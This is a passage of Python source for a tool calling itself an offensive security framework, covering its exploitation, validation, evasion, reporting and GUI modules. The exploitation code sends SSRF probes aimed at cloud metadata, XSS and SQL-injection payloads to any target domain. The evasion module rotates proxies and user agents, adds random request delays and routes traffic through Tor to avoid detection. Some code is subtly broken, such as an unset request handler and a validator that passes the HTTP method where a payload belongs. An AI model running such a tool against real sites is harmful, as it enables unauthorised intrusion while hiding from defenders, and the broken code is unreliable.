        """Checks for Server-Side Request Forgery (SSRF)."""
        self.logger.info(f"[Exploit] Checking SSRF on {url} (param: {param})")
        # Simplified check: try to access local IP or metadata endpoint
        ssrf_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/"
        ]
        for payload in ssrf_payloads:
            status, text, _, _ = await self.request_handler.fetch(url, params={param: payload} if method == "GET" else None, data={param: payload} if method == "POST" else None)
            if status == 200 and text and ("root:x" in text or "instance-id" in text): # Very basic check for /etc/passwd or AWS metadata
                self.logger.warning(f"[Exploit] Potential SSRF on {url} with param {param} (payload: {payload})")
                self.db.add_vulnerability(self.target_id, "SSRF", url, "Critical", f"Parameter '{param}' vulnerable to SSRF. Accessed internal resource: {payload}", f"Payload: {payload}", confirmed=False)
                return True
        return False

    async def run(self, urls, target_id):
        """Main entry point for the Exploitation module."""
        self.target_id = target_id
        self.logger.info(f"[Exploit] Starting exploitation attempts for {len(urls)} URLs.")
        
        exploit_tasks = []
        for url in urls:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            for param in params:
                exploit_tasks.append(self.check_sqli(url, param))
                exploit_tasks.append(self.check_xss(url, param))
                exploit_tasks.append(self.check_ssrf(url, param))
            # Also check for XSS in path if no params
            if not params:
                xss_path_payload = f"/{random.randint(1000,9999)}<script>alert('XSS')</script>"
                full_xss_url = urljoin(url, xss_path_payload)
                status, text, _, _ = await self.request_handler.fetch(full_xss_url)
                if status == 200 and text and "<script>alert('XSS')</script>" in text:
                    self.logger.warning(f"[Exploit] Potential Reflected XSS in path: {full_xss_url}")
                    self.db.add_vulnerability(self.target_id, "Reflected XSS (Path)", full_xss_url, "Medium", "XSS payload reflected in URL path.", f"Payload: {xss_path_payload}", confirmed=False)

        await asyncio.gather(*exploit_tasks)
        self.logger.info(f"[Exploit] Finished exploitation attempts.")

# --- Module 5: Zero-False-Positive Validator (The Brain) ---

class ValidatorModule:
    """Validates potential findings to minimize false positives using various heuristics."""
    def __init__(self, config, db, logger, request_handler):
        self.config = config
        self.db = db
        self.logger = logger
        self.request_handler = request_handler
        self.baseline_responses = {}

    async def get_baseline_for_url(self, url):
        """Fetches and stores a baseline response for a given URL."""
        if url not in self.baseline_responses:
            status, text, _, _ = await self.request_handler.fetch(url)
            if status == 200 and text:
                self.baseline_responses[url] = {"status": status, "text_hash": hash(text), "length": len(text)}
                self.logger.debug(f"[Validator] Baseline established for {url}")
            else:
                self.logger.warning(f"[Validator] Could not establish baseline for {url}")
        return self.baseline_responses.get(url)

    async def verify_dom_xss(self, url, param, payload):
        """Verifies DOM-based XSS using Playwright (requires Playwright to be enabled)."""
        if not self.config.get("settings.enable_playwright"):
            self.logger.warning("[Validator] Playwright not enabled, cannot verify DOM-based XSS.")
            return False
        
        from playwright.async_api import async_playwright
        self.logger.info(f"[Validator] Verifying DOM-based XSS for {url} with payload {payload}")
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                # Construct URL with payload
                if '?' in url:
                    test_url = f"{url}&{param}={payload}"
                else:
                    test_url = f"{url}?{param}={payload}"

                await page.goto(test_url)
                
                # Check for alert or specific DOM modification
                # This is a simplified check. Real-world would involve more sophisticated DOM analysis.
                # For example, injecting a known string and checking if it appears in the DOM.
                content = await page.content()
                if payload in content: # Check if payload is reflected in the DOM
                    self.logger.info(f"[Validator] DOM-based XSS confirmed by reflection in content for {url}")
                    await browser.close()
                    return True
                
                await browser.close()
        except Exception as e:
            self.logger.error(f"[Validator] Error during Playwright DOM XSS verification: {e}")
        return False

    async def validate_sqli_differential(self, url, param, method="GET"):
        """Performs differential analysis for boolean-based SQLi."""
        self.logger.info(f"[Validator] Validating boolean-based SQLi for {url} (param: {param})")
        payload_true = "\' AND 1=1-- -"
        payload_false = "\' AND 1=2-- -"

        status_true, text_true, _, _ = await self.request_handler.fetch(url, params={param: payload_true} if method == "GET" else None, data={param: payload_true} if method == "POST" else None)
        status_false, text_false, _, _ = await self.request_handler.fetch(url, params={param: payload_false} if method == "GET" else None, data={param: payload_false} if method == "POST" else None)

        if status_true == 200 and status_false == 200 and text_true != text_false:
            self.logger.warning(f"[Validator] Confirmed Boolean-based SQLi on {url} with param {param}")
            return True
        return False

    async def validate_ssti(self, url, param, method="GET"):
        """Validates Server-Side Template Injection (SSTI) by injecting a mathematical expression."""
        self.logger.info(f"[Validator] Validating SSTI for {url} (param: {param})")
        payload = "{{7*7}}"
        expected_result = "49"

        status, text, _, _ = await self.request_handler.fetch(url, params={param: payload} if method == "GET" else None, data={param: payload} if method == "POST" else None)

        if status == 200 and text and expected_result in text:
            self.logger.warning(f"[Validator] Confirmed SSTI on {url} with param {param}")
            return True
        return False

    async def run(self, potential_vulnerabilities):
        """Main entry point for the Validator module."""
        self.logger.info(f"[Validator] Starting validation for {len(potential_vulnerabilities)} potential findings.")
        
        validated_vulnerabilities = []
        for vuln_type, url, param, method in potential_vulnerabilities:
            is_confirmed = False
            if vuln_type == "SQLi":
                is_confirmed = await self.validate_sqli_differential(url, param, method)
            elif vuln_type == "XSS":
                is_confirmed = await self.verify_dom_xss(url, param, method) # Simplified, should pass payload
            elif vuln_type == "SSTI":
                is_confirmed = await self.validate_ssti(url, param, method)
            
            if is_confirmed:
                validated_vulnerabilities.append((vuln_type, url, param, method))
                self.logger.info(f"[Validator] Finding confirmed: {vuln_type} on {url}")
            else:
                self.logger.info(f"[Validator] Finding not confirmed: {vuln_type} on {url}")
        
        self.logger.info(f"[Validator] Finished validation. Confirmed {len(validated_vulnerabilities)} vulnerabilities.")
        return validated_vulnerabilities

# --- Module 6: High-Performance Architecture (The Core) ---

class PerformanceModule:
    """Manages high-performance aspects like concurrency, deduplication, and rate limiting."""
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger
        # Placeholder for Bloom filter (requires pybloom_live)
        self.seen_items = set() # In-memory set for simplicity
        self.task_queue = asyncio.Queue()
        self.rate_limiter_tokens = self.config.get("settings.concurrency") # Simple token bucket
        self.rate_limiter_last_refill = time.time()

    async def acquire_token(self):
        """Acquires a token for rate limiting."""
        while True:
            now = time.time()
            refill_amount = (now - self.rate_limiter_last_refill) * (self.config.get("settings.concurrency") / 1.0) # 1 token per second per concurrency
            self.rate_limiter_tokens = min(self.config.get("settings.concurrency"), self.rate_limiter_tokens + refill_amount)
            self.rate_limiter_last_refill = now

            if self.rate_limiter_tokens >= 1:
                self.rate_limiter_tokens -= 1
                break
            await asyncio.sleep(0.1) # Wait for tokens to refill

    def add_to_seen(self, item):
        """Adds an item to the deduplication set."""
        self.seen_items.add(item)

    def is_seen(self, item):
        """Checks if an item has been seen before."""
        return item in self.seen_items

    async def producer(self, items):
        """Adds items to the task queue."""
        for item in items:
            await self.task_queue.put(item)

    async def consumer(self, worker_func):
        """Consumes items from the task queue and processes them."""
        while True:
            item = await self.task_queue.get()
            try:
                await self.acquire_token()
                await worker_func(item)
            finally:
                self.task_queue.task_done()

    async def run_pipeline(self, items, worker_func, num_consumers=None):
        """Runs a producer-consumer pipeline."""
        if num_consumers is None:
            num_consumers = self.config.get("settings.concurrency")

        self.logger.info(f"[Performance] Starting pipeline with {num_consumers} consumers.")
        
        # Start consumers
        consumers = [asyncio.create_task(self.consumer(worker_func)) for _ in range(num_consumers)]
        
        # Start producer
        await self.producer(items)
        
        # Wait for all tasks to be done
        await self.task_queue.join()
        
        # Cancel consumers
        for c in consumers:
            c.cancel()
        await asyncio.gather(*consumers, return_exceptions=True)
        self.logger.info(f"[Performance] Pipeline finished.")

# --- Module 7: Reporting & Collaboration ---

class ReportingModule:
    """Generates various types of reports (HTML, JSON, PDF, Markdown) and handles collaboration features."""
    def __init__(self, config, db, logger):
        self.config = config
        self.db = db
        self.logger = logger

    def generate_html_report(self, target_id, domain, vulnerabilities):
        """Generates an interactive HTML report."""
        self.logger.info(f"[Reporting] Generating HTML report for {domain}")
        report_dir = "reports"
        os.makedirs(report_dir, exist_ok=True)
        report_path = os.path.join(report_dir, f"{domain}_report.html")

        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Aegis-Omni Report - {domain}</title>
            <style>
                body {{ font-family: sans-serif; margin: 20px; background-color: #1e1e1e; color: #e0e0e0; }}
                h1, h2 {{ color: #00ff00; }}
                .container {{ max-width: 1000px; margin: auto; background-color: #2a2a2a; padding: 20px; border-radius: 8px; }}
                .vuln-item {{ background-color: #3a3a3a; padding: 15px; margin-bottom: 10px; border-radius: 5px; border-left: 5px solid #ff0000; }}
                .vuln-item h3 {{ margin-top: 0; color: #ff0000; }}
                .vuln-item p {{ margin-bottom: 5px; }}
                .severity-Critical {{ border-left-color: #ff0000; }}
                .severity-High {{ border-left-color: #ff8c00; }}
                .severity-Medium {{ border-left-color: #ffd700; }}
                .severity-Low {{ border-left-color: #00bfff; }}
                .severity-Info {{ border-left-color: #00ff00; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Aegis-Omni Scan Report</h1>
                <p><strong>Target:</strong> {domain}</p>
                <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                
                <h2>Vulnerabilities ({len(vulnerabilities)})</h2>
                <div>
        """

        for vuln in vulnerabilities:
            html_content += f"""
                    <div class="vuln-item severity-{vuln['severity']}">
                        <h3>{vuln['type']}</h3>
                        <p><strong>URL:</strong> <a href="{vuln['url']}" target="_blank">{vuln['url']}</a></p>
                        <p><strong>Severity:</strong> {vuln['severity']}</p>
                        <p><strong>Description:</strong> {vuln['description']}</p>
                        <p><strong>Proof:</strong> <pre>{vuln['proof']}</pre></p>
                        <p><strong>Confirmed:</strong> {'Yes' if vuln['confirmed'] else 'No'}</p>
                    </div>
            """
        
        html_content += """
                </div>
            </div>
        </body>
        </html>
        """

        with open(report_path, "w") as f:
            f.write(html_content)
        self.logger.info(f"[Reporting] HTML report saved to {report_path}")
        return report_path

    def generate_json_export(self, target_id, domain, vulnerabilities):
        """Generates a machine-readable JSON export."""
        self.logger.info(f"[Reporting] Generating JSON export for {domain}")
        report_dir = "reports"
        os.makedirs(report_dir, exist_ok=True)
        report_path = os.path.join(report_dir, f"{domain}_report.json")

        data = {
            "target": domain,
            "scan_date": datetime.now().isoformat(),
            "vulnerabilities": [
                dict(vuln) for vuln in vulnerabilities
            ]
        }

        with open(report_path, "w") as f:
            json.dump(data, f, indent=4)
        self.logger.info(f"[Reporting] JSON export saved to {report_path}")
        return report_path

    # Placeholder for PDF and Markdown reports (requires fpdf2, markdown libraries)
    def generate_pdf_report(self, target_id, domain, vulnerabilities):
        self.logger.info(f"[Reporting] PDF report generation not fully implemented. Placeholder for {domain}")
        return None

    def generate_markdown_report(self, target_id, domain, vulnerabilities):
        self.logger.info(f"[Reporting] Markdown report generation not fully implemented. Placeholder for {domain}")
        return None

    async def run(self, target_id, domain):
        """Main entry point for the Reporting module."""
        self.logger.info(f"[Reporting] Generating reports for {domain}")
        vulnerabilities = self.db.get_vulnerabilities_for_target(target_id)
        
        # Convert sqlite.Row objects to dicts for easier handling
        vulnerabilities_dicts = [dict(row) for row in vulnerabilities]

        html_report = self.generate_html_report(target_id, domain, vulnerabilities_dicts)
        json_export = self.generate_json_export(target_id, domain, vulnerabilities_dicts)
        pdf_report = self.generate_pdf_report(target_id, domain, vulnerabilities_dicts)
        md_report = self.generate_markdown_report(target_id, domain, vulnerabilities_dicts)

        return {
            "html": html_report,
            "json": json_export,
            "pdf": pdf_report,
            "markdown": md_report
        }

# --- Module 8: Evasion & Anti-Forensics ---

class EvasionModule:
    """Implements techniques to evade detection and anti-bot mechanisms."""
    def __init__(self, config, logger):
        self.config = config
        self.logger = logger

    def get_random_user_agent(self):
        """Returns a random user-agent string."""
        return random.choice(self.config.get("settings.user_agent_pool"))

    def get_proxy_for_request(self):
        """Returns a proxy URL from the configured list, rotating them."""
        proxies = self.config.get("settings.proxy_list")
        if not proxies:
            return None
        return random.choice(proxies) # Simple random choice for now

    async def apply_request_jitter(self):
        """Applies a random delay to simulate human-like request patterns."""
        min_delay = self.config.get("settings.request_delay_min")
        max_delay = self.config.get("settings.request_delay_max")
        await asyncio.sleep(random.uniform(min_delay, max_delay))

    async def tor_integration_check(self):
        """Checks if Tor integration is enabled and functional."""
        if self.config.get("settings.enable_tor"):
            self.logger.info("[Evasion] Tor integration enabled. Attempting to route traffic via Tor.")
            # This would involve configuring aiohttp to use the SOCKS5 proxy
            # For actual implementation, 'stem' library would be used to control Tor process
            # and check connectivity.
            try:
                status, text, _, _ = await self.request_handler.fetch("https://check.torproject.org/", proxy=self.config.get("settings.tor_proxy"))
                if status == 200 and text and "Congratulations. This browser is configured to use Tor." in text:
                    self.logger.info("[Evasion] Tor connection verified.")
                    return True
                else:
                    self.logger.warning("[Evasion] Tor connection failed or not verified.")
            except Exception as e:
                self.logger.error(f"[Evasion] Error checking Tor connectivity: {e}")
        return False

    # Placeholder for TLS fingerprint randomization (requires curl_cffi or similar)
    def get_tls_fingerprint_headers(self):
        self.logger.debug("[Evasion] TLS fingerprint randomization not fully implemented.")
        return {}

    async def run(self):
        """Main entry point for the Evasion module (mostly passive configuration)."""
        self.logger.info("[Evasion] Evasion module initialized.")
        await self.tor_integration_check()

# --- Module 9: Machine Learning & Automation ---

class MLModule:
    """Applies machine learning techniques for vulnerability prioritization, payload generation, and anomaly detection."""
    def __init__(self, config, db, logger):
        self.config = config
        self.db = db
        self.logger = logger
        self.model = None # Placeholder for a scikit-learn model

    def train_vulnerability_prioritization_model(self):
        """Trains a simple ML model to prioritize vulnerabilities based on past findings."""
        self.logger.info("[ML] Training vulnerability prioritization model (placeholder).")
        # This would involve loading past vulnerability data from the DB,
        # feature engineering (e.g., URL length, parameter count, keyword presence),
        # and training a classifier (e.g., RandomForestClassifier from scikit-learn).
        # For now, it's a conceptual placeholder.
        try:
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.model_selection import train_test_split
            from sklearn.feature_extraction.text import TfidfVectorizer
            import pandas as pd

            # Dummy data for demonstration
            data = [
                {"url": "http://example.com/vuln?id=1", "type": "SQLi", "severity": "Critical", "confirmed": True},
                {"url": "http://example.com/page?q=test", "type": "XSS", "severity": "Medium", "confirmed": False},
                {"url": "http://example.com/admin", "type": "Admin Panel", "severity": "High", "confirmed": True},
                {"url": "http://example.com/test", "type": "Info Disclosure", "severity": "Low", "confirmed": False},
            ]
            df = pd.DataFrame(data)
            df["text_features"] = df["url"] + " " + df["type"]
            
            vectorizer = TfidfVectorizer()
            X = vectorizer.fit_transform(df["text_features"])
            y = df["confirmed"]

            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            self.model = RandomForestClassifier(random_state=42)
            self.model.fit(X_train, y_train)
            self.logger.info("[ML] Dummy model trained successfully.")
        except ImportError:
            self.logger.warning("[ML] scikit-learn not installed. Skipping ML model training.")
        except Exception as e:
            self.logger.error(f"[ML] Error training model: {e}")

    def predict_vulnerability_priority(self, vulnerability_data):
        """Predicts the priority/likelihood of a vulnerability."""
        if not self.model:
            self.logger.warning("[ML] ML model not trained. Cannot predict priority.")
            return "Medium" # Default fallback
        
        # This would involve transforming vulnerability_data into features
        # compatible with the trained model and then calling model.predict_proba()
        self.logger.debug(f"[ML] Predicting priority for: {vulnerability_data['url']}")
        return "High" # Placeholder result

    def intelligent_wordlist_expansion(self, crawled_content):
        """Extracts keywords from crawled content to expand wordlists dynamically."""
        self.logger.info("[ML] Expanding wordlists based on crawled content (placeholder).")
        # This would involve NLP techniques (TF-IDF, keyword extraction) on the text content
        # of discovered URLs to find domain-specific terms for fuzzing.
        keywords = re.findall(r'\b[a-zA-Z]{4,}\b', crawled_content.lower())
        unique_keywords = set(keywords)
        self.logger.debug(f"[ML] Extracted {len(unique_keywords)} keywords.")
        return list(unique_keywords)

    async def run(self):
        """Main entry point for the ML & Automation module."""
        self.logger.info("[ML] ML module initialized.")
        self.train_vulnerability_prioritization_model()

# --- Module 10: GUI & User Experience ---

class AegisApp:
    """The main Tkinter GUI application for Aegis-Omni."""
    def __init__(self, root):
        self.root = root
        self.root.title("Aegis-Omni v1.0 - Monolithic Offensive Security Framework")
        self.root.geometry("1400x900")
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        self.config = AegisConfig()
        self.db = AegisDB()
        self.setup_logging()
        
        self.request_handler = RequestHandler(self.config, self.logger)
        self.validator = ValidatorModule(self.config, self.db, self.logger, self.request_handler)
        self.recon_module = ReconModule(self.config, self.db, self.logger, self.request_handler)
        self.dorking_module = DorkingModule(self.config, self.db, self.logger, self.request_handler)
        self.fuzzing_module = FuzzingModule(self.config, self.db, self.logger, self.request_handler)
        self.exploit_module = ExploitModule(self.config, self.db, self.logger, self.request_handler, self.validator)
        self.performance_module = PerformanceModule(self.config, self.logger)
        self.reporting_module = ReportingModule(self.config, self.db, self.logger)
        self.evasion_module = EvasionModule(self.config, self.logger)
        self.ml_module = MLModule(self.config, self.db, self.logger)

        self.current_scan_task = None
        self.setup_ui()
        self.apply_theme(self.config.get("theme"))
        self.update_stats_display()

    def setup_logging(self):
        """Configures logging to display messages in the GUI console and stdout."""
        self.logger = logging.getLogger("AegisOmni")
        self.logger.setLevel(logging.DEBUG)
        
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
        self.logger.addHandler(console_handler)

        # GUI handler
        self.gui_log_queue = asyncio.Queue() # Use asyncio queue for thread-safe GUI updates
        self.gui_log_handler = self.QueueHandler(self.gui_log_queue)
        self.gui_log_handler.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
        self.logger.addHandler(self.gui_log_handler)
        self.root.after(100, self.poll_log_queue) # Start polling the log queue

    class QueueHandler(logging.Handler):
        """A logging handler that puts messages into an asyncio queue."""
        def __init__(self, queue):
            super().__init__()
            self.queue = queue

        def emit(self, record):
            try:
                self.queue.put_nowait(self.format(record))
            except asyncio.QueueFull:
                pass

    def poll_log_queue(self):
        """Polls the log queue and updates the GUI log text widget."""
        while True:
            try:
                record = self.gui_log_queue.get_nowait()
                self.log_text.config(state="normal")
                self.log_text.insert("end", record + "\n")
                self.log_text.see("end")
                self.log_text.config(state="disabled")
            except asyncio.QueueEmpty:
                break
        self.root.after(100, self.poll_log_queue)

    def setup_ui(self):
        """Sets up the main Tkinter GUI layout and widgets."""
        # Main frame for content
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill="both", expand=True)

        # Notebook for tabs
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill="both", expand=True)

        # Tab 1: Dashboard
        self.tab_dashboard = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_dashboard, text="Dashboard")
        self.setup_dashboard()

        # Tab 2: Recon
        self.tab_recon = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_recon, text="Recon")
        self.setup_recon_tab()

        # Tab 3: Dorking
        self.tab_dorking = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_dorking, text="Dorking")
        self.setup_dorking_tab()

        # Tab 4: Fuzzing
        self.tab_fuzzing = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_fuzzing, text="Fuzzing")
        self.setup_fuzzing_tab()

        # Tab 5: Exploitation
        self.tab_exploit = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_exploit, text="Exploitation")
        self.setup_exploit_tab()

        # Tab 6: Vulnerabilities
        self.tab_vulns = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_vulns, text="Vulnerabilities")
        self.setup_vulns_tab()

        # Tab 7: Settings
        self.tab_settings = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_settings, text="Settings")
        self.setup_settings()

        # Log Console at the bottom
        self.log_frame = ttk.LabelFrame(main_frame, text="Logs", padding="5")
        self.log_frame.pack(fill="x", side="bottom", pady=5)
        self.log_text = tk.Text(self.log_frame, height=10, state="disabled", wrap="word",
                                bg="#2a2a2a", fg="#00ff00", insertbackground="#00ff00",
                                selectbackground="#005500", selectforeground="#ffffff")
        self.log_text.pack(fill="x", expand=True)
        self.log_text_scrollbar = ttk.Scrollbar(self.log_frame, command=self.log_text.yview)
        self.log_text_scrollbar.pack(side="right", fill="y")
        self.log_text.config(yscrollcommand=self.log_text_scrollbar.set)

    def apply_theme(self, theme_name):
        """Applies a dark or light theme to the GUI."""
        if theme_name == "dark":
            self.root.tk_setPalette(background='#1e1e1e', foreground='#e0e0e0',
                                    activeBackground='#3a3a3a', activeForeground='#ffffff',
                                    highlightBackground='#00ff00', highlightForeground='#00ff00',
                                    text='#e0e0e0', selectBackground='#005500', selectForeground='#ffffff',
                                    insertBackground='#00ff00')
            self.log_text.config(bg="#2a2a2a", fg="#00ff00", insertbackground="#00ff00")
            style = ttk.Style()
            style.theme_use('clam')
            style.configure("TNotebook", background="#1e1e1e")
            style.map("TNotebook.Tab", background=[("selected", "#3a3a3a")], foreground=[("selected", "#00ff00")])
            style.configure("TFrame", background="#1e1e1e")
            style.configure("TLabel", background="#1e1e1e", foreground="#e0e0e0")
            style.configure("TButton", background="#3a3a3a", foreground="#00ff00", borderwidth=1, focusthickness=3, focuscolor="#00ff00")
            style.map("TButton", background=[('active', '#005500')])
            style.configure("TEntry", fieldbackground="#3a3a3a", foreground="#e0e0e0", insertcolor="#00ff00")
            style.configure("TCheckbutton", background="#1e1e1e", foreground="#e0e0e0")
            style.configure("Treeview", background="#2a2a2a", foreground="#e0e0e0", fieldbackground="#2a2a2a")
            style.map("Treeview", background=[('selected', '#005500')])
            style.configure("Treeview.Heading", background="#3a3a3a", foreground="#00ff00")
        else: # Light theme
            self.root.tk_setPalette(background='#f0f0f0', foreground='#333333')
            self.log_text.config(bg="#ffffff", fg="#000000", insertbackground="#000000")
            style = ttk.Style()
            style.theme_use('default')
            style.configure("TNotebook", background="#f0f0f0")
            style.map("TNotebook.Tab", background=[("selected", "#e0e0e0")], foreground=[("selected", "#333333")])
            style.configure("TFrame", background="#f0f0f0")
            style.configure("TLabel", background="#f0f0f0", foreground="#333333")
            style.configure("TButton", background="#e0e0e0", foreground="#333333")
            style.configure("TEntry", fieldbackground="#ffffff", foreground="#333333")
            style.configure("TCheckbutton", background="#f0f0f0", foreground="#333333")
            style.configure("Treeview", background="#ffffff", foreground="#333333", fieldbackground="#ffffff")
            style.map("Treeview", background=[('selected', '#a0c0ff')])
            style.configure("Treeview.Heading", background="#e0e0e0", foreground="#333333")

    def setup_dashboard(self):
        """Sets up the Dashboard tab with target input and scan controls."""
        lbl = ttk.Label(self.tab_dashboard, text="Aegis-Omni Offensive Framework", font=("Helvetica", 20, "bold"))
        lbl.pack(pady=30)
        
        target_frame = ttk.LabelFrame(self.tab_dashboard, text="Target Configuration", padding="10")
        target_frame.pack(pady=10, padx=20, fill="x")
        
        ttk.Label(target_frame, text="Target Domain:", font=("Helvetica", 12)).grid(row=0, column=0, padx=10, pady=5, sticky="w")
        self.target_entry = ttk.Entry(target_frame, width=60, font=("Helvetica", 12))
        self.target_entry.grid(row=0, column=1, padx=10, pady=5, sticky="ew")
        target_frame.grid_columnconfigure(1, weight=1)

        button_frame = ttk.Frame(target_frame)
        button_frame.grid(row=1, column=0, columnspan=2, pady=10)
        self.btn_start = ttk.Button(button_frame, text="Launch Full Scan", command=self.start_full_scan)
        self.btn_start.pack(side="left", padx=5)
        self.btn_stop = ttk.Button(button_frame, text="Stop Scan", command=self.stop_scan, state="disabled")
        self.btn_stop.pack(side="left", padx=5)
        self.btn_report = ttk.Button(button_frame, text="Generate Reports", command=self.generate_reports, state="disabled")
        self.btn_report.pack(side="left", padx=5)

        stats_frame = ttk.LabelFrame(self.tab_dashboard, text="Real-time Statistics", padding="10")
        stats_frame.pack(pady=20, padx=20, fill="both", expand=True)
        
        self.stat_subs = ttk.Label(stats_frame, text="Subdomains Found: 0", font=("Helvetica", 14))
        self.stat_subs.pack(pady=5, anchor="w")
        self.stat_urls = ttk.Label(stats_frame, text="URLs Discovered: 0", font=("Helvetica", 14))
        self.stat_urls.pack(pady=5, anchor="w")
        self.stat_vulns = ttk.Label(stats_frame, text="Vulnerabilities Confirmed: 0", font=("Helvetica", 14))
        self.stat_vulns.pack(pady=5, anchor="w")

    def setup_recon_tab(self):
        """Sets up the Reconnaissance tab with subdomain display."""
        recon_frame = ttk.Frame(self.tab_recon, padding="10")
        recon_frame.pack(fill="both", expand=True)

        ttk.Label(recon_frame, text="Discovered Subdomains:", font=("Helvetica", 14)).pack(pady=10, anchor="w")
        self.sub_tree = ttk.Treeview(recon_frame, columns=("Subdomain", "IP", "Source", "Resolved At"), show="headings")
        self.sub_tree.heading("Subdomain", text="Subdomain")
        self.sub_tree.heading("IP", text="IP Address")
        self.sub_tree.heading("Source", text="Source")
        self.sub_tree.heading("Resolved At", text="Resolved At")
        self.sub_tree.column("Subdomain", width=250)
        self.sub_tree.column("IP", width=150)
        self.sub_tree.column("Source", width=100)
        self.sub_tree.column("Resolved At", width=150)
        self.sub_tree.pack(fill="both", expand=True)

    def setup_dorking_tab(self):
        """Sets up the Dorking tab with dork input and results display."""
        dork_frame = ttk.Frame(self.tab_dorking, padding="10")
        dork_frame.pack(fill="both", expand=True)

        ttk.Label(dork_frame, text="Dorking Results (URLs):").pack(pady=10, anchor="w")
        self.dork_tree = ttk.Treeview(dork_frame, columns=("URL", "Source", "Status"), show="headings")
        self.dork_tree.heading("URL", text="URL")
        self.dork_tree.heading("Source", text="Source")
        self.dork_tree.heading("Status", text="Status")
        self.dork_tree.column("URL", width=400)
        self.dork_tree.column("Source", width=100)
        self.dork_tree.column("Status", width=80)
        self.dork_tree.pack(fill="both", expand=True)

    def setup_fuzzing_tab(self):
        """Sets up the Fuzzing tab with fuzzing controls and results."""
        fuzz_frame = ttk.Frame(self.tab_fuzzing, padding="10")
        fuzz_frame.pack(fill="both", expand=True)

        ttk.Label(fuzz_frame, text="Fuzzing Discoveries:").pack(pady=10, anchor="w")
        self.fuzz_tree = ttk.Treeview(fuzz_frame, columns=("Type", "URL", "Status"), show="headings")
        self.fuzz_tree.heading("Type", text="Type")
        self.fuzz_tree.heading("URL", text="URL")
        self.fuzz_tree.heading("Status", text="Status")
        self.fuzz_tree.column("Type", width=150)
        self.fuzz_tree.column("URL", width=400)
        self.fuzz_tree.column("Status", width=80)
        self.fuzz_tree.pack(fill="both", expand=True)

    def setup_exploit_tab(self):
        """Sets up the Exploitation tab with exploit results."""
        exploit_frame = ttk.Frame(self.tab_exploit, padding="10")
        exploit_frame.pack(fill="both", expand=True)

        ttk.Label(exploit_frame, text="Exploitation Attempts:").pack(pady=10, anchor="w")
        self.exploit_tree = ttk.Treeview(exploit_frame, columns=("Type", "URL", "Parameter", "Status"), show="headings")
        self.exploit_tree.heading("Type", text="Type")
        self.exploit_tree.heading("URL", text="URL")
        self.exploit_tree.heading("Parameter", text="Parameter")
        self.exploit_tree.heading("Status", text="Status")
        self.exploit_tree.column("Type", width=150)
        self.exploit_tree.column("URL", width=300)
        self.exploit_tree.column("Parameter", width=150)
        self.exploit_tree.column("Status", width=80)
        self.exploit_tree.pack(fill="both", expand=True)

    def setup_vulns_tab(self):
        """Sets up the Vulnerabilities tab to display confirmed findings."""
        vulns_frame = ttk.Frame(self.tab_vulns, padding="10")
        vulns_frame.pack(fill="both", expand=True)

        ttk.Label(vulns_frame, text="Confirmed Vulnerabilities:", font=("Helvetica", 14)).pack(pady=10, anchor="w")
        self.vuln_tree = ttk.Treeview(vulns_frame, columns=("Type", "URL", "Severity", "Description", "Confirmed"), show="headings")
        self.vuln_tree.heading("Type", text="Type")
        self.vuln_tree.heading("URL", text="URL")
        self.vuln_tree.heading("Severity", text="Severity")
        self.vuln_tree.heading("Description", text="Description")
        self.vuln_tree.heading("Confirmed", text="Confirmed")
        self.vuln_tree.column("Type", width=150)
        self.vuln_tree.column("URL", width=300)
        self.vuln_tree.column("Severity", width=80)
        self.vuln_tree.column("Description", width=300)
        self.vuln_tree.column("Confirmed", width=80)
        self.vuln_tree.pack(fill="both", expand=True)

    def setup_settings(self):
        """Sets up the Settings tab for API keys and general configuration."""
        settings_frame = ttk.Frame(self.tab_settings, padding="10")
        settings_frame.pack(fill="both", expand=True)

        # API Keys
        keys_frame = ttk.LabelFrame(settings_frame, text="API Keys", padding="10")
        keys_frame.pack(fill="x", padx=5, pady=5)
        
        self.api_entries = {}
        for i, (key, value) in enumerate(self.config.data["api_keys"].items()):
            ttk.Label(keys_frame, text=f"{key.replace('_', ' ').title()}:").grid(row=i, column=0, padx=5, pady=5, sticky="w")
            entry = ttk.Entry(keys_frame, width=60)
            entry.insert(0, value)
            entry.grid(row=i, column=1, padx=5, pady=5, sticky="ew")
            self.api_entries[key] = entry
        keys_frame.grid_columnconfigure(1, weight=1)

        # General Settings
        general_settings_frame = ttk.LabelFrame(settings_frame, text="General Settings", padding="10")
        general_settings_frame.pack(fill="x", padx=5, pady=10)

        # Concurrency
        ttk.Label(general_settings_frame, text="Concurrency:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.concurrency_var = tk.IntVar(value=self.config.get("settings.concurrency"))
        ttk.Entry(general_settings_frame, textvariable=self.concurrency_var, width=10).grid(row=0, column=1, padx=5, pady=5, sticky="w")

        # Request Delay
        ttk.Label(general_settings_frame, text="Request Delay (min-max seconds):").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        delay_frame = ttk.Frame(general_settings_frame)
        delay_frame.grid(row=1, column=1, padx=5, pady=5, sticky="w")
        self.delay_min_var = tk.DoubleVar(value=self.config.get("settings.request_delay_min"))
